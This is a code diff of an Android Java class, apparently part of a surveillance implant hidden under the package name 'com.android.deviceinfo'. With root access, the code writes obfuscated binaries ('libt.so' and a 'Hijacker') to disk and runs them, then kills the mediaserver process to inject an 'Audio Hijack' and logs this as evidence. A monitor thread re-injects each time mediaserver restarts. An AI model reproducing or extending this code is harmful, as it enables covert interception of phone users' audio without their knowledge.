@@ -7,12 +7,19 @@ import java.io.InputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
+import com.android.deviceinfo.Beep;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.Configuration;
-import com.android.deviceinfo.evidence.EvidenceReference;
+
+import com.android.deviceinfo.file.Directory;
+
+import com.android.deviceinfo.evidence.EvidenceBuilder;
+
 import com.android.deviceinfo.file.AutoFile;
+
 import com.android.m.M;
 
 public class Instrument {
@@ -54,7 +61,7 @@ public class Instrument {
 		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
 
 		try {
-			if (Root.isRootShellInstalled() == false) {
+			if (PackageInfo.checkRoot() == false) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(installHijacker): Nope, we are not root");
 				}
@@ -76,6 +83,7 @@ public class Instrument {
 			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
+
 			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
 
 			stream.close();
@@ -95,7 +103,7 @@ public class Instrument {
 	}
 
 	public boolean startInstrumentation() {
-		if (Root.isRootShellInstalled() == false) {
+		if (PackageInfo.checkRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
 			}
@@ -145,6 +153,11 @@ public class Instrument {
 							}
 							started = true;
 							file.delete();
+							
+							if(Cfg.DEMO){
+								Beep.beep();
+								Beep.bip();
+							}
 						}
 
 					}
@@ -161,15 +174,17 @@ public class Instrument {
 						Check.log(TAG + " (startInstrumentation) Kill mediaserver");
 					}
 					killProc();
+					// Utils.sleep(1000);
+					// newpid = getProcessPid();
 					killed += 1;
-				}
-				
-				if (started && Cfg.DEBUG) {
-					Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
-					EvidenceReference.info("Audio Hijack");
-				}
 
-				stopMonitor = false;
+					if (started && Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
+						EvidenceBuilder.info("Audio Hijack");
+					}
+
+					stopMonitor = false;
+				}
 
 				if (pidMonitor == null) {
 					if (Cfg.DEBUG) {
@@ -177,16 +192,17 @@ public class Instrument {
 						Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
 					}
 
-					pidMonitor = new MediaserverMonitor(pid);
+					pidMonitor = new MediaserverMonitor(newpid);
 					monitor = new Thread(pidMonitor);
 					monitor.start();
-				}else{
-					pidMonitor.setPid(pid);
+				} else {
+					pidMonitor.setPid(newpid);
 				}
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(getProcessPid): unable to get pid");
 				}
+
 			}
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -196,7 +212,7 @@ public class Instrument {
 		} finally {
 			deleteHijacker();
 		}
-		
+
 		return true;
 	}
 
@@ -208,7 +224,9 @@ public class Instrument {
 	private int getProcessPid() {
 		int pid;
 		byte[] buf = new byte[4];
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getProcessPid) " + proc + " " + pidCompletePath);
+		}
 		Execute.execute(Configuration.shellFile + " " + M.e("lid") + " " + proc + " " + pidCompletePath);
 
 		try {
@@ -239,6 +257,9 @@ public class Instrument {
 	public void killProc() {
 		try {
 			int pid = getProcessPid();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (killProc) try to kill " + pid);
+			}
 			Execute.executeRoot("kill " + pid);
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -249,8 +270,9 @@ public class Instrument {
 
 	class MediaserverMonitor implements Runnable {
 		private int cur_pid, start_pid;
-		
-		public void setPid(int pid){
+		private int failedCounter = 0;
+
+		public void setPid(int pid) {
 			start_pid = pid;
 		}
 
@@ -265,8 +287,7 @@ public class Instrument {
 		@Override
 		public void run() {
 			while (true) {
-				Utils.sleep(10000);
-
+				
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
@@ -277,19 +298,26 @@ public class Instrument {
 				}
 
 				cur_pid = getProcessPid();
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (MediaserverMonitor run) pid: " + cur_pid);
-				}
 
 				// Mediaserver died
 				if (cur_pid != start_pid) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
 					}
-					
-					startInstrumentation();
-					//start_pid = getProcessPid();
+
+					failedCounter += 1;
+					if (failedCounter < 3) {
+						startInstrumentation();
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
+						}
+					}
+				} else {
+					failedCounter = 0;
 				}
+				
+				Utils.sleep(10000);
 			}
 		}
 	}
